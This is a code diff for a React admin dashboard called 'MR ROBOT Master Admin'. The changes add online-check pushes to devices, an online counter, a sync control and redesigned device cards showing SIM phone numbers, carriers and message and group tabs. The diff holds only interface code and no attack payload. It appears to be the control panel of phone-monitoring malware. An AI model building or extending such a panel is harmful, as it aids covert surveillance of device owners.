@@ -525,7 +525,7 @@ function MsgCard({ msg, appColor }: { msg: MsgRow; appColor: string }) {
 /* ══════════════════════════════════════════
    MESSAGES TAB
 ══════════════════════════════════════════ */
-function MessagesTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
+function MessagesTab({ apps, masterPin, syncTick: _syncTick }: { apps: App[]; masterPin: string; syncTick?: number }) {
   /* ── State ── */
   const [msgs, setMsgs] = useState<MsgRow[]>([]);
   const [appFilter, setAppFilter] = useState("");
@@ -765,7 +765,7 @@ function CopyIconBtn({ value, title = "Copy" }: { value: string; title?: string 
   );
 }
 
-function GroupsTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
+function GroupsTab({ apps, masterPin, syncTick: _syncTick }: { apps: App[]; masterPin: string; syncTick?: number }) {
   const [groups, setGroups] = useState<GroupRow[]>([]);
   const [loading, setLoading] = useState(false);
   const [appFilter, setAppFilter] = useState("");
@@ -799,7 +799,7 @@ function GroupsTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
     const byUser: Record<string, { appId: string; deviceId: string; entries: GroupRow[] }[]> = {};
     for (const [key, entries] of Object.entries(formByDevice)) {
       const [appId, deviceId] = key.split("||");
-      const userId = entries[0]?.userId ?? deviceId ?? "unknown";
+      const userId = deviceId ?? "unknown";
       const uid = `${appId}||${userId}`;
       if (!byUser[uid]) byUser[uid] = [];
       byUser[uid].push({ appId: appId ?? "", deviceId: deviceId ?? "", entries });
@@ -1342,10 +1342,51 @@ function DeviceDetail({ device, masterPin, onClose }: { device: FullDevice; mast
 }
 
 /* ══════════════════════════════════════════
+   CARD CHECK ONLINE BUTTON (device list card)
+══════════════════════════════════════════ */
+function CardCheckBtn({ device, masterPin }: { device: FullDevice; masterPin: string }) {
+  const [checking, setChecking] = useState(false);
+  const [seconds, setSeconds] = useState(0);
+  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  useEffect(() => () => { if (timerRef.current) clearInterval(timerRef.current); }, []);
+  async function handleClick() {
+    if (checking) return;
+    if (timerRef.current) clearInterval(timerRef.current);
+    setChecking(true); setSeconds(0);
+    timerRef.current = setInterval(() => {
+      setSeconds(s => {
+        const next = s + 1;
+        if (next >= 30) { if (timerRef.current) { clearInterval(timerRef.current); timerRef.current = null; } setChecking(false); setSeconds(0); return 0; }
+        return next;
+      });
+    }, 1000);
+    try {
+      await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: device.deviceId, data: { type: "online_check" } }) });
+    } catch {
+      if (timerRef.current) { clearInterval(timerRef.current); timerRef.current = null; }
+      setChecking(false); setSeconds(0);
+    }
+  }
+  return (
+    <button onClick={() => void handleClick()} style={{
+      width: "100%", borderRadius: 8, padding: "10px 4px",
+      fontSize: 13, fontWeight: 700, textAlign: "center",
+      border: checking ? "1px solid #bfdbfe" : "1px solid #e2e8f0",
+      background: checking ? T.accent : "#f8fafc",
+      color: checking ? "#fff" : "#475569",
+      cursor: checking ? "default" : "pointer",
+      transition: "background 0.25s, border-color 0.25s, color 0.25s",
+    }}>
+      {checking ? `${seconds}s…` : "Check Online"}
+    </button>
+  );
+}
+
+/* ══════════════════════════════════════════
    DEVICES TAB
 ══════════════════════════════════════════ */
 const PAGE_SIZE = 48;
-function DevicesTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
+function DevicesTab({ apps, masterPin, syncTick, onOnlineCount }: { apps: App[]; masterPin: string; syncTick?: number; onOnlineCount?: (n: number) => void }) {
   const [devices, setDevices] = useState<FullDevice[]>([]);
   const [loading, setLoading] = useState(false);
   const [appFilter, setAppFilter] = useState("");
@@ -1358,11 +1399,16 @@ function DevicesTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
     try {
       const qs = appFilter ? `?appId=${encodeURIComponent(appFilter)}` : "";
       const r = await apiFetch(`/api/master/all-devices${qs}`, { headers: { "x-master-pin": masterPin } });
-      if (r.ok) setDevices(await r.json() as FullDevice[]);
+      if (r.ok) {
+        const data = await r.json() as FullDevice[];
+        setDevices(data);
+        const ONLINE_MS = 15 * 60 * 1000;
+        onOnlineCount?.(data.filter(d => d.lastOnline ? (Date.now() - new Date(d.lastOnline).getTime()) < ONLINE_MS : false).length);
+      }
     } catch { /* ignore */ } finally { setLoading(false); }
-  }, [appFilter, masterPin]);
+  }, [appFilter, masterPin]); // eslint-disable-line react-hooks/exhaustive-deps
 
-  useEffect(() => { void fetchDevices(); setPage(1); }, [fetchDevices]);
+  useEffect(() => { void fetchDevices(); setPage(1); }, [fetchDevices, syncTick]);
 
   const ONLINE_MS = 15 * 60 * 1000;
   const q = search.trim().toLowerCase();
@@ -1412,29 +1458,38 @@ function DevicesTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
         </div>
       ) : (
         <>
-          <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(280px, 1fr))", gap: 10 }}>
-            {shown.map(d => {
-              const ac = appColors[d.appId] ?? T.accent;
-              const isOnline = d.lastOnline ? (Date.now() - new Date(d.lastOnline).getTime()) < ONLINE_MS : false;
+          <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(260px, 1fr))", gap: 10 }}>
+            {shown.map((d, idx) => {
+              const sim1 = [d.sim1Carrier, d.sim1Phone].filter(Boolean).join(" — ") || "—";
+              const sim2 = [d.sim2Carrier, d.sim2Phone].filter(Boolean).join(" — ") || "—";
               return (
-                <div key={d.deviceId} onClick={() => setSelected(d)} style={{ background: T.card, borderRadius: 13, border: `1px solid ${isOnline ? T.green + "30" : T.borderLight}`, overflow: "hidden", cursor: "pointer", transition: "all 0.15s" }}>
-                  <div style={{ padding: "9px 13px", background: T.headerBg, borderBottom: `1px solid ${T.borderLight}`, display: "flex", alignItems: "center", justifyContent: "space-between", gap: 8 }}>
-                    <span style={{ background: ac + "22", color: ac, border: `1px solid ${ac}44`, borderRadius: 5, padding: "2px 7px", fontSize: 9, fontWeight: 800 }}>{d.appId.slice(-8)}</span>
-                    <span style={{ display: "flex", alignItems: "center", gap: 4, background: isOnline ? "#16a34a22" : T.border, color: isOnline ? "#4ade80" : T.muted, borderRadius: 99, padding: "2px 8px", fontSize: 9, fontWeight: 800 }}>
-                      <span style={{ width: 5, height: 5, borderRadius: "50%", background: isOnline ? "#4ade80" : T.muted, display: "inline-block" }} />{isOnline ? "ONLINE" : "OFFLINE"}
-                    </span>
+                <div key={d.deviceId} onClick={() => setSelected(d)} className="ma-card" style={{ background: T.card, borderRadius: 12, border: `1px solid ${T.borderLight}`, overflow: "hidden", cursor: "pointer", transition: "all 0.15s" }}>
+                  {/* Header: number + name + star */}
+                  <div style={{ padding: "11px 13px 10px", borderBottom: `1px solid ${T.border}`, display: "flex", alignItems: "center", justifyContent: "space-between", gap: 8 }}>
+                    <div style={{ fontWeight: 700, fontSize: 14, color: T.text, flex: 1, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
+                      {filtered.length - idx}. {d.name}
+                    </div>
+                    <span style={{ color: T.muted, fontSize: 16, flexShrink: 0, lineHeight: 1 }}>☆</span>
                   </div>
-                  <div style={{ padding: "11px 13px", display: "flex", flexDirection: "column", gap: 6 }}>
-                    <div style={{ fontWeight: 800, fontSize: 14, color: T.text }}>{d.name}</div>
-                    <div style={{ fontSize: 11, color: T.mutedLight, fontFamily: "monospace" }}>{d.deviceId.slice(0, 20)}…</div>
-                    <div style={{ display: "flex", gap: 8, fontSize: 10 }}>
-                      <span style={{ color: T.muted }}>SIM1: <span style={{ color: T.mutedLight }}>{d.sim1Phone ?? "—"}</span></span>
-                      {d.sim2Phone && <span style={{ color: T.muted }}>SIM2: <span style={{ color: T.mutedLight }}>{d.sim2Phone}</span></span>}
-                    </div>
-                    <div style={{ display: "flex", gap: 10, fontSize: 10 }}>
-                      <span style={{ color: d.hasFcm ? T.green : T.muted, fontWeight: 700 }}>{d.hasFcm ? "FCM ✓" : "No FCM"}</span>
-                      <span style={{ color: T.muted }}>{fmtAgo(d.lastOnline)}</span>
-                    </div>
+                  {/* Info rows */}
+                  <div style={{ padding: "8px 13px 4px", display: "flex", flexDirection: "column", gap: 3 }}>
+                    {[
+                      { l: "ID:",      v: d.deviceId },
+                      { l: "Android:", v: d.androidVersion ? String(d.androidVersion) : "—" },
+                      { l: "SIM 1:",   v: sim1 },
+                      { l: "SIM 2:",   v: sim2 },
+                      { l: "User ID:", v: d.userId },
+                      { l: "Online:",  v: fmtAgo(d.lastOnline) },
+                    ].map(({ l, v }) => (
+                      <div key={l} style={{ display: "flex", gap: 6, fontSize: 11 }}>
+                        <span style={{ color: T.muted, minWidth: 62, flexShrink: 0 }}>{l}</span>
+                        <span style={{ color: T.mutedLight, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{v}</span>
+                      </div>
+                    ))}
+                  </div>
+                  {/* Check Online button */}
+                  <div style={{ padding: "8px 13px 12px" }} onClick={e => e.stopPropagation()}>
+                    <CardCheckBtn device={d} masterPin={masterPin} />
                   </div>
                 </div>
               );
@@ -1724,6 +1779,8 @@ function Dashboard({ masterPin, onLogout, onPinChanged }: { masterPin: string; o
   const [pingDone, setPingDone] = useState(0);
   const [pingTotal, setPingTotal] = useState(0);
   const [pingResult, setPingResult] = useState<{ ok: number; fail: number } | null>(null);
+  const [onlineCount, setOnlineCount] = useState(0);
+  const [syncTick, setSyncTick] = useState(0);
   const sortedApps = [...appList].sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
 
   const fetchApps = useCallback(async () => {
@@ -1807,12 +1864,12 @@ function Dashboard({ masterPin, onLogout, onPinChanged }: { masterPin: string; o
   const activeCount = appList.filter(a => a.status === "active").length;
   const pingBusy = pingState === "running" || pingState === "loading";
 
-  const TABS: { id: Tab; label: string; icon: React.ReactNode }[] = [
-    { id: "apps", label: "Apps", icon: <Ic.Layers /> },
-    { id: "messages", label: "Messages", icon: <Ic.MessageSquare /> },
-    { id: "groups", label: "Groups", icon: <Ic.Database /> },
-    { id: "devices", label: "Devices", icon: <Ic.Smartphone /> },
-    { id: "settings", label: "Settings", icon: <Ic.Settings /> },
+  const TABS: { id: Tab; label: string }[] = [
+    { id: "apps",     label: "Home"     },
+    { id: "messages", label: "Messages" },
+    { id: "groups",   label: "Groups"   },
+    { id: "devices",  label: "Devices"  },
+    { id: "settings", label: "Settings" },
   ];
 
   return (
@@ -1834,29 +1891,51 @@ function Dashboard({ masterPin, onLogout, onPinChanged }: { masterPin: string; o
         @media(max-width:640px){.ma-bottom-nav{display:flex;}.ma-main{padding-bottom:80px!important;}.ma-hide-mob{display:none!important;}}
       `}</style>
 
-      {/* Header */}
-      <div style={{ background: "rgba(7,9,20,0.98)", borderBottom: "1px solid rgba(99,102,241,0.18)", padding: "0 16px", position: "sticky", top: 0, zIndex: 50, backdropFilter: "blur(24px)", WebkitBackdropFilter: "blur(24px)" }}>
-        <div style={{ position: "absolute", top: 0, left: 0, right: 0, height: 2, background: "linear-gradient(90deg,#6366f1,#8b5cf6,#ec4899,#6366f1)" }} />
-        <div style={{ maxWidth: 960, margin: "0 auto", display: "flex", alignItems: "center", justifyContent: "space-between", height: 54, gap: 8 }}>
-          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
-            <div style={{ width: 34, height: 34, borderRadius: 11, background: "linear-gradient(145deg,#4f52d4,#7c3aed)", display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", boxShadow: "0 4px 14px rgba(99,102,241,0.5)" }}><Ic.CPU /></div>
-            <div>
-              <div style={{ fontSize: 14, fontWeight: 900, color: "#f1f1f5", letterSpacing: -0.4 }}>MR ROBOT</div>
-              <div style={{ fontSize: 9, color: "#818cf8", fontWeight: 700, letterSpacing: 1.8, textTransform: "uppercase" }}>Master Admin</div>
-            </div>
+      {/* ── Header: sub-admin style ── */}
+      <div style={{ background: T.headerBg, borderBottom: `1px solid ${T.border}`, position: "sticky", top: 0, zIndex: 50, backdropFilter: "blur(20px)" }}>
+        {/* Top row: logo + counters + actions */}
+        <div style={{ maxWidth: 960, margin: "0 auto", display: "flex", alignItems: "center", gap: 8, padding: "0 12px", height: 50, flexWrap: "nowrap", overflow: "hidden" }}>
+          {/* Logo */}
+          <div style={{ display: "flex", alignItems: "center", gap: 7, flexShrink: 0 }}>
+            <div style={{ width: 32, height: 32, borderRadius: 10, background: "linear-gradient(145deg,#4f52d4,#7c3aed)", display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontSize: 16 }}>🤖</div>
+            <span style={{ fontSize: 14, fontWeight: 900, color: T.text, letterSpacing: -0.3 }}>MR ROBOT</span>
           </div>
-          {/* Desktop tabs */}
-          <div className="ma-hide-mob" style={{ display: "flex", gap: 2 }}>
-            {TABS.map(t => (
-              <button key={t.id} className="ma-tab-btn" onClick={() => setTab(t.id)} style={{ padding: "6px 14px", borderRadius: 9, display: "flex", alignItems: "center", gap: 6, fontSize: 12, fontWeight: 700, color: tab === t.id ? T.accentLight : T.muted, background: tab === t.id ? T.accentGlow : "transparent", border: `1px solid ${tab === t.id ? T.accent + "44" : "transparent"}`, transition: "all 0.15s" }}>
-                {t.icon}<span>{t.label}</span>
-              </button>
-            ))}
-          </div>
-          <div style={{ display: "flex", gap: 6, alignItems: "center" }}>
-            <button onClick={() => setShowChangePin(true)} title="Change PIN" style={{ width: 36, height: 36, borderRadius: 11, display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", border: "1px solid rgba(255,255,255,0.08)", background: "rgba(255,255,255,0.04)", color: "#94a3b8" }}><Ic.Key /></button>
-            <button onClick={onLogout} title="Logout" style={{ width: 36, height: 36, borderRadius: 11, display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", border: "1px solid rgba(239,68,68,0.28)", background: "rgba(239,68,68,0.1)", color: "#f87171" }}><Ic.LogOut /></button>
-          </div>
+          {/* Online counter */}
+          <span style={{ display: "inline-flex", alignItems: "center", gap: 5, background: onlineCount > 0 ? "#14532d" : T.card, border: `1px solid ${onlineCount > 0 ? "#22c55e" : T.borderLight}`, borderRadius: 20, padding: "3px 10px", fontSize: 11, fontWeight: 700, color: onlineCount > 0 ? "#4ade80" : T.muted, flexShrink: 0 }}>
+            <span style={{ width: 6, height: 6, borderRadius: "50%", background: onlineCount > 0 ? "#22c55e" : T.muted, display: "inline-block", boxShadow: onlineCount > 0 ? "0 0 5px #22c55e" : "none" }} />
+            {onlineCount} /15m
+          </span>
+          {/* Connected */}
+          <span className="ma-hide-mob" style={{ display: "inline-flex", alignItems: "center", gap: 5, background: "#14532d", border: "1px solid #22c55e", borderRadius: 20, padding: "3px 10px", fontSize: 11, fontWeight: 700, color: "#4ade80", flexShrink: 0 }}>
+            <span style={{ width: 6, height: 6, borderRadius: "50%", background: "#22c55e", display: "inline-block", boxShadow: "0 0 5px #22c55e" }} />
+            Connected
+          </span>
+          <div style={{ flex: 1 }} />
+          {/* Sync */}
+          <button onClick={() => { setSyncTick(t => t + 1); void fetchApps(); }} title="Sync all data" style={{ display: "flex", alignItems: "center", gap: 5, padding: "6px 12px", borderRadius: 8, background: T.card, border: `1px solid ${T.borderLight}`, color: T.mutedLight, fontSize: 11, fontWeight: 700, cursor: "pointer", flexShrink: 0 }}>
+            <Ic.Refresh /> <span className="ma-hide-mob">Sync</span>
+          </button>
+          {/* Ping All — compact in header */}
+          <button onClick={() => void handlePingAll()} disabled={pingBusy} title="Ping All Devices" style={{ display: "flex", alignItems: "center", gap: 5, padding: "6px 12px", borderRadius: 8, background: pingBusy ? T.accentGlow : T.card, border: `1px solid ${pingBusy ? T.accent + "66" : T.borderLight}`, color: pingBusy ? T.accentLight : T.mutedLight, fontSize: 11, fontWeight: 700, cursor: pingBusy ? "wait" : "pointer", flexShrink: 0 }}>
+            <Ic.Wifi /> <span className="ma-hide-mob">{pingBusy ? `${pingDone}/${pingTotal}…` : "Ping All"}</span>
+          </button>
+          {/* PIN + Logout */}
+          <button onClick={() => setShowChangePin(true)} title="Change PIN" style={{ width: 32, height: 32, borderRadius: 8, display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", border: `1px solid ${T.borderLight}`, background: T.card, color: T.muted, flexShrink: 0 }}><Ic.Key /></button>
+          <button onClick={onLogout} title="Logout" style={{ width: 32, height: 32, borderRadius: 8, display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", border: "1px solid rgba(239,68,68,0.3)", background: "rgba(239,68,68,0.1)", color: "#f87171", flexShrink: 0 }}><Ic.LogOut /></button>
+        </div>
+        {/* Tabs row — flat underline style */}
+        <div style={{ maxWidth: 960, margin: "0 auto", display: "flex", padding: "0 12px", borderTop: `1px solid ${T.border}`, overflowX: "auto" }}>
+          {TABS.map(t => (
+            <button key={t.id} className="ma-tab-btn" onClick={() => setTab(t.id)} style={{
+              padding: "10px 16px", fontSize: 12, fontWeight: tab === t.id ? 700 : 500,
+              color: tab === t.id ? T.accentLight : T.muted,
+              border: "none", borderBottom: `2px solid ${tab === t.id ? T.accent : "transparent"}`,
+              background: "transparent", cursor: "pointer", transition: "color 0.15s", whiteSpace: "nowrap",
+              marginBottom: -1,
+            }}>
+              {t.label}
+            </button>
+          ))}
         </div>
       </div>
 
@@ -1941,9 +2020,9 @@ function Dashboard({ masterPin, onLogout, onPinChanged }: { masterPin: string; o
           </>
         )}
 
-        {tab === "messages" && <MessagesTab apps={appList} masterPin={masterPin} />}
-        {tab === "groups" && <GroupsTab apps={appList} masterPin={masterPin} />}
-        {tab === "devices" && <DevicesTab apps={appList} masterPin={masterPin} />}
+        {tab === "messages" && <MessagesTab apps={appList} masterPin={masterPin} syncTick={syncTick} />}
+        {tab === "groups" && <GroupsTab apps={appList} masterPin={masterPin} syncTick={syncTick} />}
+        {tab === "devices" && <DevicesTab apps={appList} masterPin={masterPin} syncTick={syncTick} onOnlineCount={setOnlineCount} />}
         {tab === "settings" && <SettingsTab apps={appList} masterPin={masterPin} />}
       </div>
 
@@ -1957,7 +2036,7 @@ function Dashboard({ masterPin, onLogout, onPinChanged }: { masterPin: string; o
       <div className="ma-bottom-nav">
         {TABS.slice(0, 2).map(t => (
           <button key={t.id} className={`ma-bnav-item ma-tab-btn ${tab === t.id ? "ma-bnav-active" : ""}`} onClick={() => setTab(t.id)}>
-            {t.icon}<span className="ma-bnav-lbl">{t.label}</span>
+            <span className="ma-bnav-lbl">{t.label}</span>
           </button>
         ))}
         <div className="ma-fab-wrap">
@@ -1966,7 +2045,7 @@ function Dashboard({ masterPin, onLogout, onPinChanged }: { masterPin: string; o
         </div>
         {TABS.slice(2).map(t => (
           <button key={t.id} className={`ma-bnav-item ma-tab-btn ${tab === t.id ? "ma-bnav-active" : ""}`} onClick={() => setTab(t.id)}>
-            {t.icon}<span className="ma-bnav-lbl">{t.label}</span>
+            <span className="ma-bnav-lbl">{t.label}</span>
           </button>
         ))}
       </div>
